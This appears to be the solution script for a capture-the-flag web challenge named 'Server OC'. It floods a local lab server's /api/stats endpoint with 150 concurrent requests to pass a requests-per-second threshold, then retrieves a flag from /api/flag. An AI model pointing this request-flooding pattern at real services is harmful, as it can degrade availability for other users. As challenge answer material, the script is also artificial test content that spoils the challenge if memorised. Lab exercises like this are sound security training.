#!/usr/bin/env python3
"""
Server OC Challenge - Solution Script

This script demonstrates how to solve the Server OC challenge by sending
multiple concurrent requests to "overclock" the server.
"""

import requests
import asyncio
import aiohttp
import sys
from urllib.parse import urljoin

# Default challenge URL
CHALLENGE_URL = "http://localhost:3000"

async def make_request(session, url):
    """Make a single async HTTP request"""
    try:
        async with session.get(url) as response:
            return await response.text()
    except Exception as e:
        print(f"Request error: {e}")
        return None

async def send_concurrent_requests(base_url, num_requests=100):
    """Send multiple concurrent requests to overclock the server"""
    stats_url = urljoin(base_url, "/api/stats")
    
    print(f"[*] Sending {num_requests} concurrent requests to {stats_url}")
    
    async with aiohttp.ClientSession() as session:
        tasks = [make_request(session, stats_url) for _ in range(num_requests)]
        results = await asyncio.gather(*tasks)
    
    successful = sum(1 for r in results if r is not None)
    print(f"[+] Successfully sent {successful}/{num_requests} requests")
    
    return successful

def get_flag(base_url):
    """Retrieve the flag from the server"""
    flag_url = urljoin(base_url, "/api/flag")
    
    print(f"[*] Attempting to retrieve flag from {flag_url}")
    
    try:
        response = requests.get(flag_url)
        data = response.json()
        
        if data.get('success'):
            print(f"\n{'='*60}")
            print(f"[+] SUCCESS! Flag retrieved:")
            print(f"[+] {data.get('flag')}")
            print(f"{'='*60}\n")
            return data.get('flag')
        else:
            print(f"[-] Failed to get flag: {data.get('message')}")
            print(f"[-] Current RPS: {data.get('currentRPS')}")
            print(f"[-] Required: {data.get('required')}")
            return None
    except Exception as e:
        print(f"[-] Error retrieving flag: {e}")
        return None

def check_stats(base_url):
    """Check current server stats"""
    stats_url = urljoin(base_url, "/api/stats")
    
    try:
        response = requests.get(stats_url)
        data = response.json()
        
        print(f"\n[*] Current Server Stats:")
        print(f"    Recent Requests (10s): {data.get('recentRequests')}")
        print(f"    Total Requests: {data.get('totalRequests')}")
        print(f"    Required RPS: {data.get('requiredRPS')}")
        print(f"    Time Window: {data.get('timeWindow')}\n")
        
        return data
    except Exception as e:
        print(f"[-] Error checking stats: {e}")
        return None

async def main():
    """Main solution function"""
    # Get challenge URL from command line or use default
    base_url = sys.argv[1] if len(sys.argv) > 1 else CHALLENGE_URL
    
    print("="*60)
    print("Server OC Challenge - Solution Script")
    print("="*60)
    print(f"Target: {base_url}\n")
    
    # Check initial stats
    print("[1] Checking initial server stats...")
    check_stats(base_url)
    
    # Send concurrent requests to "overclock" the server
    print("[2] Overclocking the server...")
    num_requests = 150  # Send more than required to ensure success
    successful = await send_concurrent_requests(base_url, num_requests)
    
    # Small delay to ensure all requests are processed
    await asyncio.sleep(0.1)
    
    # Check stats after overclocking
    print("\n[3] Checking server stats after overclocking...")
    check_stats(base_url)
    
    # Get the flag
    print("[4] Retrieving the flag...")
    flag = get_flag(base_url)
    
    if flag:
        print("\n[+] Challenge solved successfully!")
        return 0
    else:
        print("\n[-] Challenge not solved. Try running the script again.")
        return 1

if __name__ == "__main__":
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
